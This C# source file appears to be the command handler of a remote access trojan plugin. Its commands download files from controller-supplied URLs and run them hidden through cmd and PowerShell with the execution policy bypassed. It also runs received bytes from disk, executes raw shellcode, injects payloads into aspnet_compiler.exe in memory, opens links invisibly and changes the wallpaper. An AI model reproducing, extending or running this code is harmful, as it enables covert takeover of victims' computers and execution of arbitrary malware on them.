using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static string[] userAgents = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };

	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void Read(byte[] data)
	{
		try
		{
			object[] objects = LEB128.Read(data);
			string text = (string)objects[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 8:
				switch (text[0])
				{
				case 'O':
					if (text == "OpenLink")
					{
						Process.Start((string)objects[1]);
						Thread.Sleep(2000);
						Client.Disconnect();
					}
					break;
				case 'S':
					if (!(text == "SendDisk"))
					{
						if (text == "SendLink")
						{
							string text2 = (string)objects[1];
							string text3 = ".exe";
							string text4 = text2.Split(new char[1] { '/' })[text2.Split(new char[1] { '/' }).Length - 1];
							if (text4.Contains("."))
							{
								text3 = "." + text4.Split(new char[1] { '.' })[text4.Split(new char[1] { '.' }).Length - 1];
							}
							if (text2.Contains("https"))
							{
								ServicePointManager.Expect100Continue = true;
								ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
								ServicePointManager.DefaultConnectionLimit = 9999;
							}
							string text5 = Path.GetTempFileName() + text3;
							File.WriteAllBytes(text5, new WebClient().DownloadData(text2));
							Process.Start(new ProcessStartInfo
							{
								FileName = "cmd",
								Arguments = "/c start /b powershell –ExecutionPolicy Bypass Start-Process -FilePath '\"" + text5 + "\"' & exit",
								CreateNoWindow = true,
								WindowStyle = ProcessWindowStyle.Hidden,
								UseShellExecute = true,
								ErrorDialog = false
							});
							Client.Send(LEB128.Write(new object[2] { "SendFileDisk", text5 }));
							Thread.Sleep(2000);
							Client.Disconnect();
						}
					}
					else
					{
						string text6 = Path.GetTempFileName() + (string)objects[1];
						File.WriteAllBytes(text6, (byte[])objects[2]);
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd",
							Arguments = "/c start /b powershell –ExecutionPolicy Bypass Start-Process -FilePath '\"" + text6 + "\"' & exit",
							CreateNoWindow = true,
							WindowStyle = ProcessWindowStyle.Hidden,
							UseShellExecute = true,
							ErrorDialog = false
						});
						Client.Send(LEB128.Write(new object[2] { "SendFileDisk", text6 }));
						Thread.Sleep(2000);
						Client.Disconnect();
					}
					break;
				}
				break;
			case 11:
				switch (text[0])
				{
				case 'O':
					if (!(text == "OpenLinkInv"))
					{
						break;
					}
					try
					{
						ServicePointManager.Expect100Continue = true;
						ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
						ServicePointManager.DefaultConnectionLimit = 9999;
					}
					catch (Exception)
					{
					}
					try
					{
						HttpWebRequest obj = (HttpWebRequest)WebRequest.Create((string)objects[1]);
						obj.UserAgent = userAgents[new Random().Next(userAgents.Length)];
						obj.AllowAutoRedirect = true;
						obj.Timeout = 10000;
						obj.Method = "GET";
						using ((HttpWebResponse)obj.GetResponse())
						{
						}
					}
					catch
					{
					}
					Thread.Sleep(2000);
					Client.Disconnect();
					break;
				case 'S':
					if (text == "SendDiskGet")
					{
						Client.Send(LEB128.Write(objects));
					}
					break;
				}
				break;
			case 9:
				switch (text[0])
				{
				case 'W':
					if (text == "Wallpaper")
					{
						new Wallpaper().Change((byte[])objects[1], (string)objects[2]);
						Thread.Sleep(2000);
						Client.Disconnect();
					}
					break;
				case 'S':
					if (text == "ShellCode")
					{
						new Thread((ThreadStart)delegate
						{
							Shellcode.Run((byte[])objects[1], fork: true);
						}).Start();
						Thread.Sleep(2000);
						Client.Disconnect();
					}
					break;
				}
				break;
			case 13:
				if (text == "SendMemoryGet")
				{
					Client.Send(LEB128.Write(objects));
				}
				break;
			case 10:
				if (text == "SendMemory")
				{
					SendToMemory.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), "aspnet_compiler.exe"), (byte[])objects[1]);
					Client.Send(LEB128.Write(new object[2]
					{
						"SendFileMemory",
						(string)objects[2]
					}));
					Thread.Sleep(2000);
					Client.Disconnect();
				}
				break;
			case 12:
				break;
			}
		}
		catch (Exception ex2)
		{
			Client.Error(ex2.ToString());
		}
	}
}
